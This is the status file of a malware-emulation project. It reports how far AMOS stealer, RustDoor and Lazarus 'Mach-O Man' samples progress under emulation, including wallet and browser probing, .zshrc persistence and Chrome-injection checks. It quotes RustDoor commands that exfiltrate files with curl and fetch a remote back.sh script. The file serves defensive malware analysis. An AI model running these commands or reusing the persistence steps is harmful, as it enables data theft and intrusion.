# Sample Status

This file tracks the current state of the local sample corpus as it relates to
emulator behavior.

## `arm64_hello`

- Path: [fixtures/macos/bin/arm64_hello](D:/dev/quiling/qiling/fixtures/macos/bin/arm64_hello)
- Role: smoke-test fixture
- Expected status: should execute successfully
- Current note: used as the primary quick validation sample for `cargo build --bin machina` and basic runtime checks

## `2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho`

- Path: [fixtures/macos/bin/2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho](D:/dev/quiling/qiling/fixtures/macos/bin/2d0dda75bfc90e7ffda72640eb32c7ff9f51c90c30f4a6d1e05df93e58848f36.macho)
- Family: AMOS stealer
- Architecture: arm64
- Current observed status:
  - probes browser and wallet paths
  - probes browser profile roots such as Chrome, Brave, Edge, and Firefox
  - attempts to open wallet/private data such as Binance, Electrum, Coinomi, and Exodus paths
  - reads synthetic fallback content from guest filesystem policy
  - CI regression guard verifies these milestones from JSONL trace output on Ubuntu
- Important implication:
  - emulator is already past bootstrap/runtime-only execution and into real stealer logic
  - next compatibility work should focus on richer profile traversal and artifact semantics rather than simple `ENOENT` fixes

## `0393e898f4425195d780346634e619b80f283a8223b9724db56dee87afbba486.macho`

- Path: [fixtures/macos/bin/0393e898f4425195d780346634e619b80f283a8223b9724db56dee87afbba486.macho](D:/dev/quiling/qiling/fixtures/macos/bin/0393e898f4425195d780346634e619b80f283a8223b9724db56dee87afbba486.macho)
- Current observed status:
  - retained as a large arm64 analysis target
- Important implication:
  - this sample is both an execution target and a reverse-engineering reference set

## `rustdoor/76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho`

- Path: [fixtures/macos/bin/rustdoor/76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho](D:/dev/quiling/qiling/fixtures/macos/bin/rustdoor/76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho)
- Family: RustDoor
- Architecture: arm64
- Current observed status:
  - parses, maps, and loads Foundation/AppKit/CoreFoundation/Security/libobjc dependencies
  - reaches real runtime/import activity instead of stopping at initial unresolved bindings
  - exercises TLV bootstrap, signal/bootstrap imports, heap growth, `memcmp`, `memmove`, `memcpy`, `malloc`, `realloc`, and `free`
  - now synthetically handles arm64 LSE `ldadd`, `ldapr`, and `cas` runtime atomics that previously consumed the execution budget
  - resolves bootstrap environment lookups such as `getenv("HOME")` from the synthetic guest envp
  - resolves high/tagged literal pointers in libc memory imports, including the path build for `/Users/analyst/.docks`
  - uses chunked synthetic heap mapping so Rust runtime allocation churn no longer exhausts Unicorn memory sections
  - records `posix_spawnp` for `log stream --predicate ... restartInitiated/shutdownInitiated ... --info` and can feed synthetic matching log events into the redirected pipe
  - treats hidden `.inj_*` marker files as absent by default, so RustDoor does not falsely assume Chrome injection already happened
  - progresses through the daemonization path (`fork`, `chdir`, `setsid`, second `fork`) and the grandchild becomes the active daemon
  - tagged-PC FETCH faults now redirect PC to the canonical address, so execution no longer accumulates additional tagged pages for each `bl`/`adrp` from a tagged page
  - the daemon-singleton check on `/tmp/com.apple.lock` now reports `ENOENT`, so the freshly emulated daemon "wins" the lock instead of immediately exiting on the assumption another daemon is already present
  - the LSE atomic hook now also handles `SWP[A][L]` and the rest of the `LDADD`/`LDCLR`/`LDEOR`/`LDSET`/`LDSMAX`/`LDSMIN`/`LDUMAX`/`LDUMIN` family, not just `CAS`/`LDADD`/`LDAPR`. The OnceLock release `SWPAL x8, x8, [x19]` at `0x10018242C` previously hung because Unicorn did not advance PC for it; with the explicit emulator that path now completes (transitioning `0x10026D450`/`0x10026D1D8` from `RUNNING` (2) to `COMPLETE` (3) so the init trampoline returns instead of looping).
  - the synthetic `_waitpid` import now reports `ECHILD` for `WNOHANG` polls when no reapable child is left, mirroring `_wait4`. Without that, the post-OnceLock daemon spun forever in `waitpid(-1, &status, WNOHANG) == 0`.
  - the `_exit` libc symbol is now hooked in addition to the BSD `__exit` syscall wrapper, so the daemon's clean shutdown actually terminates instead of falling through to the generic zero-return stub
  - the `done_addr` cleanup hook now honors `stop_now` even when an `exited_pid` is also reported — the previous `else if` chain meant the runner kept running the dead caller's tail after the daemon exit
  - off-canvas data pages (e.g. `0xA00000000`) are now synthesized for tagged data writes that fall outside the canonical heap/mmap arena, so the post-`waitpid` `WaitStatus` store at `[x19, #8]` (which packs an enum discriminant into bits 32–35) succeeds
  - the parent process (`PID=1`, after the daemon detached) now reaches Chrome-injection probing:
    - `_stat /Applications/Google Chrome.app/Contents/MacOS/Google Chrome` (Chrome detection)
    - `_stat /Users/analyst/.docks/.inj_rc_chr` → `ENOENT` (Chrome rc-injection marker)
    - `_stat /Users/analyst/.docks/.inj_launch_chr` → `ENOENT` (Chrome launch-injection marker)
  - daemon child PID=3 now runs all the way through its persistence path and reaches the **first malware-interesting `posix_spawnp`** from the article:
    - opens `~/.zshrc`, reads it in 32→2048-byte windows, then re-opens it `read_write` and writes injected lines for shell-startup persistence (the literal payload — initially `\n\n`, more after the spawn returns — is dumped to `target/machina-captures/file_pid<pid>_fd<fd>_<sanitized>.bin`)
    - opens `~/.docks/cron` and `/tmp/com.apple.lock.<timestamp>` for cron-style and lock persistence
    - `_stat`s the `~/.local` and `~/.zshrc` parents during persistence prep
    - then `posix_spawnp("log", ["log", "stream", "--predicate", "eventMessage contains \"com.apple.restartInitiated\" or eventMessage contains \"com.apple.shutdownInitiated\"", "--info"])` — exactly the shutdown-monitor command from Unit42's Table 1
  - the per-instance `/tmp/com.apple.lock.<timestamp>` marker now reports `ENOENT` like the bare `/tmp/com.apple.lock`, so the daemon doesn't conclude "another instance already installed me" and exit early; combined with `O_CREAT` honoring (see below) it actually creates the lock and proceeds to spawn the log-stream watcher.
  - the open path now honors `O_CREAT` (Darwin `0x200`) for paths the materialization policy normally suppresses. Without that, the malware's "open RDONLY → ENOENT, retry as `O_RDWR|O_CREAT|O_TRUNC`" lock-creation pattern looped back to `ENOENT` on the second open and the daemon panicked instead of moving past the lock check.
  - file writes to synthetic guest fds are now appended to `target/machina-captures/file_pid<pid>_fd<fd>_<sanitized_path>.bin`, configurable via `MACHINA_PAYLOAD_DUMP_DIR`, so analysts can inspect the actual payload bytes (e.g. the `~/.zshrc` injection) instead of just a 128-byte preview.
  - the immediate post-daemon blocker observed under the legacy 10M-instruction budget was `instruction_budget_exhausted` deep inside the parent's Rust `OnceLock`/init trampoline at the `cas64` → `blr` pattern around `0x100182424` / `0x10018242C`; with the SWP/`_exit`/`done_addr` fixes that path now completes well within the default profile
  - the worker-thread `brk #0x1` at `0x10000AE00` is no longer reachable: the panic was caused by `_fcntl(kq, F_DUPFD_CLOEXEC, _)` returning `-1` because `duplicate_synthetic_fd` only consults `process_fd_targets` and kqueue fds live in `os.kqueues`. The fcntl hook now detects kqueue fds, clones the kevent registration set into a fresh kqueue fd, and clamps the bogus stack-pointer-shaped min-fd argument that mio leaks through inlined helpers. After this, the worker bootstraps Tokio's macOS event loop the same way real Tokio does: `_kqueue` → 131072, `_fcntl(kq, F_SETFD, _)`, `_fcntl(kq, F_DUPFD_CLOEXEC, _)` → 131073, EVFILT_USER waker registration via `_kevent(ident=0, filter=-10, flags=EV_ADD|EV_CLEAR|EV_RECEIPT)`, `_fcntl(kq, F_DUPFD_CLOEXEC, 1)` → 131074.
  - **current next blocker:** after the worker bootstraps its kqueue + EVFILT_USER waker, the daemon TID=3 reads 320 bytes from the log-stream pipe (the synthetic `restartInitiated` / `shutdownInitiated` log entries fed in by `posix_spawnp`), then both threads block waiting for further async events. The remaining instruction budget is consumed by the parent process spinning in a `OnceLock`/atomic-load loop at `0x100100728` (function `sub_1001006FC`, an `atomic_load_explicit(&qword_10026D408, memory_order_acquire) != 3` re-check). To reach the rest of Unit42's Table-1 commands (`chflags hidden npm`, `chmod +x npm`, `zsh -c zip -r ...`, `zsh -c curl -F file=...`, `zsh -c curl -O https://apple-ads-metric.com/back.sh`, `zsh -c mdfind -name .pem`) we need to drive the C2 command loop — either by handing the daemon a synthetic HTTP response, or by wiring the worker's EVFILT_USER waker so Tokio actually wakes up after the log-stream pipe data is delivered. Neither blocker is a bug in the emulator — they are missing C2 / async-runtime fixtures.
- Important implication:
  - the in-process bootstrap/runtime/daemonization compatibility blockers are resolved and the emulator now reaches the first article-listed `posix_spawnp` command (`log stream --predicate ... restartInitiated/shutdownInitiated --info`)
  - Tokio's macOS worker bootstrap (kqueue + EVFILT_USER waker + duplicates) now completes successfully, no more `brk #0x1` on TID=4 — pinned by the `tests/rustdoor_fast_mode.rs` integration test
  - the next compatibility work for this family is making Tokio's poll loop emit synthetic events for the C2 HTTP requests / log-stream pipe, so the malware progresses past its async wait and into the remaining `posix_spawnp` calls (chflags / chmod / curl / zip / mdfind / reverse-shell)
- Recommended local invocation:
  - `MACHINA_PROFILE=long .\target\debug\machina.exe fixtures\macos\bin\rustdoor\76f96a35b6f638eed779dc127f29a5b537ffc3bb7accc2c9bfab5a2120ea6bc9.macho > rustdoor-trace-long.jsonl`

## `machoman/D1yCPUyk.bin.macho`

- Path: [fixtures/macos/bin/machoman/D1yCPUyk.bin.macho](D:/dev/quiling/qiling/fixtures/macos/bin/machoman/D1yCPUyk.bin.macho)
- Family: Lazarus "Mach-O Man" kit, profiler stage (companion of the
  `teamsSDK.bin` stager; downloaded as `D1<random>.bin` and run with
  a `<server_url>` argument to register the host with the C2)
- Architecture: arm64
- Source notes: heavy control-flow obfuscation (every basic block
  ends in an indirect `br xN` through a `movz`/`movk` chain plus
  garbage register ops in between), obfuscated segment names like
  `.<71` / `.hAv` / `.AR1` masking what would normally be
  `__DATA_CONST` / extra `__TEXT` shards, and a duplicate
  chained-fixups table in `__DATA_CONST` mirroring the registered
  chain in the `.<71` segment.
- Current observed status:
  - the binary uses `LC_DYLD_CHAINED_FIXUPS` instead of the legacy
    bind opcodes. Before chained-fixups support was added, any
    indirect call through `__nl_symbol_ptr` fetched the raw chain
    entry `0x8010000000000065` for `_time` (ordinal 0x65), the TBI
    handler stripped the tag, and PC landed inside the Mach-O
    header at `0x100000065`, exhausting the 50M instruction budget
    with `Imports=0 / Syscalls=0` and a `tagged-pointer-alias`
    memmon event as the smoking gun.
  - the loader now walks the chained-fixups blob at load time and
    patches every bind slot (150 in the real chain + 132 in the
    `__DATA_CONST` mirror = 282 binds) and every rebase (3 — two
    static initializers and one terminator) to the appropriate
    synthetic stub or canonical address. The fallback walker for
    unregistered mirror tables is conservative (only triggered for
    segments whose first 8 bytes match the chain-bind sentinel
    pattern).
  - emulation now boots the C++ runtime: `_getpid` / `_srand` /
    `_strlen` and the libc++ string constructors execute, and
    control reaches `std::__1::basic_ostream<...>::sentry::sentry`
    (the first thing `operator<<` does when the binary prints its
    usage message to `std::cerr`).
  - the arm64 runner now carves a fake C++ data region out of the
    mmap arena (a shared zeroed vtable + per-object slots for
    `__ZNSt3__14cerrE`, `__ZNSt3__14cinE`, the `ios_base`/
    `basic_ios`/`basic_ostream`/`basic_istream` vtables, the
    `ostringstream`/`istringstream` VTT tables, and
    `__ZNSt3__15ctypeIcE2idE`). The chained-fixups walker now
    prefers data-symbol bindings over function-stub bindings, so
    `cerr` resolves to a real ostream-shaped object and any
    `ldr xN, [cerr]` followed by a vtable-relative `ldur` walks
    through valid memory instead of stub bytes.
  - the new `src/macos/arch_arm64/cpp_imports.rs` installs custom
    code hooks at the sentry/write stubs: `basic_ostream::sentry::
    sentry(ostream&)` writes `1` to `*x0` so the sentry is marked
    good, and `basic_ostream::write(const char*, streamsize)` reads
    x1/x2 from guest memory and emits an `ostream-write` JSONL
    event with both the printable text and the raw hex.
  - emulation exits cleanly at `done_addr` with `Imports=36` (up
    from 0 pre-chained-fixups, 14 pre-data-region) and `Status=ok`.
    Three full sentry construct/destruct cycles fire, matching the
    three `<<` chunks (`"Usage: "`, argv[0], `" <server_url>\n"`).
- **Current next blocker:** the obfuscated `operator<<` body does
  *not* go through the `basic_ostream::write` import; it inlines
  the `__pad_and_output` / streambuf write path, which reaches the
  byte sink through virtual `sputn`/`sputc` calls on the fake
  vtable. With every vtable slot pointing at the return-zero
  done_addr, the writes silently no-op so no `ostream-write`
  event fires and the message bytes never surface in the trace.
  A more faithful implementation would either (a) install a real
  fake streambuf at `cerr.__rdbuf_` whose virtual `xsputn` writes
  to host stderr, or (b) intercept the binary's outermost
  `operator<<(ostream&, const char*)` template instantiation
  directly. The "usage path" itself runs to completion either way
  — the missing piece is just routing the bytes out.
- **The obfuscated usage check** sits at
  `sub_1002280F4 + 0x34 (= 0x10022812C)`: a `tbz w0, #0,
  0x100228378` that consumes the return value of
  `sub_10022AE68 → sub_10022AE90 → sub_10022AEB4 →
  sub_10022AED4: return sub_100232C28() == 0`. The inner
  `sub_100232C58` is the argc probe IDA gave up on
  (`call analysis failed funcsize=14`). When run with
  `MACHINA_BYPASS_USAGE_CHECK=0x10022AE68` the binary now reads
  argv[1] (`_strlen "http://127.0.0.1:8888"`), passes it to
  `basic_string::compare(0, 7, "http://")`, and proceeds past
  the URL check.
- The arm64 runner now installs a synthetic
  `__mod_init_func` trampoline (mapped R+W+X, passed as
  `RunReport::actual_entry` so `uc_emu_start` actually begins
  there) that calls every static initializer in order before
  tail-jumping to `_main`. The two C++ initializers register
  `___cxa_atexit` handlers via `_dladdr`, then control
  reaches `_main` with `argc/argv/envp` preserved.
- The first static initializer (at `0x100372CCC`) writes
  done_addr into ~6 GOT slots in `__DATA_CONST` (confirmed via
  GOT[117] = `_kill` slot flipping from `0x200007D00` to
  `0x200000800` between init0 entry and init1 entry). The
  arm64 runner now snapshots the GOT regions after
  chained-fixups resolves them and restores the snapshot in a
  one-shot code hook at `_main` entry, mimicking the
  `__DATA_CONST` read-only flip that real dyld performs after
  bind processing. After the fix, the `_kill` import resolves
  correctly through its install_return_stubs trampoline
  instead of silently terminating at done_addr.
- `MACHINA_TRACE_FN_ENTRY=<label>:<hex addr>,...` installs
  no-op code hooks at the given addresses and emits a
  `function-entry` JSONL event whenever execution reaches
  one. Used to pin down which paths the binary actually visits.
- A `basic_string::compare(pos, n, const char* s)` hook in
  `src/macos/arch_arm64/cpp_imports.rs` performs the real
  byte comparison, decoding both the libc++ long-form layout
  (data ptr at offset 16) and a custom layout the binary
  appears to use (the "size" slot holds a code address, so
  the hook ignores it and reads from the data pointer via
  the `n`-byte window plus a null terminator).
- **Current next blocker:** even with bypass + mod-init the
  binary still does not reach `getHostname` / `getTmpDir` /
  `get_browser_extensions` / `buildPostBody`. None of those
  symbols has a direct `bl` caller anywhere in `__TEXT` /
  `.hAv` / `.AR1` — every call to them goes through indirect
  `br xN` chains whose target is computed from a
  `movz`/`movk` sequence. Without bypass the binary enters
  an obfuscation loop that exhausts the 50M instruction
  budget calling `_time` / `_getpid` / `_srand` and the C++
  sentry imports ~1786 times each. Reaching the profile
  pipeline (sysctl / popen / curl) needs either deeper
  obfuscation work to resolve the indirect call targets, or
  a direct hook that jumps straight into `buildPostBody` /
  `getHostname` with a synthesized std::string `argv[1]`.
- Recommended local invocation:
  - `.\target\debug\machina.exe fixtures\macos\bin\machoman\D1yCPUyk.bin.macho > machoman-trace.jsonl`
  - `MACHINA_BYPASS_USAGE_CHECK="0x10022AE68" MACHINA_ARGV_APPEND="http://127.0.0.1:8888" .\target\debug\machina.exe fixtures\macos\bin\machoman\D1yCPUyk.bin.macho > machoman-bypass.jsonl` to skip the obfuscated usage check and see the URL-validation path execute

## Corpus hygiene

- New samples should be added with a short status note here.
